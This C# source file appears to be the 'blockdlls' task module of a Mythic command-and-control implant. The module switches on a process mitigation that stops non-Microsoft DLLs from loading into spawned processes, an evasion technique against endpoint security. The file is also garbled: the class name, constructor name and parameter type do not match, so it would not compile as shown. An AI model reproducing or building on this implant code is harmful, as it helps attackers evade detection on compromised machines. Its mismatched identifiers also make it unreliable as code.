#define COMMAND_NAME_UPPER

#if DEBUG
#define BLOCKDLLS
#endif

#if BLOCKDLLS
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System.Runtime.Serialization;

namespace Tasks
{
    public class NexusServiceA537 : Tasking
    {
        [DataContract]
        internal struct PhantomManager09EF
        {
            [DataMember(Name = "block")]
            public bool Value;
        }
        public blockdlls(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {

        }

        public override void Start()
        {
            BlockDllsParameters parameters = _jsonSerializer.Deserialize<BlockDllsParameters>(_data.Parameters);
            _agent.GetProcessManager().BlockDLLs(parameters.Value);
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
        }
    }
}
#endif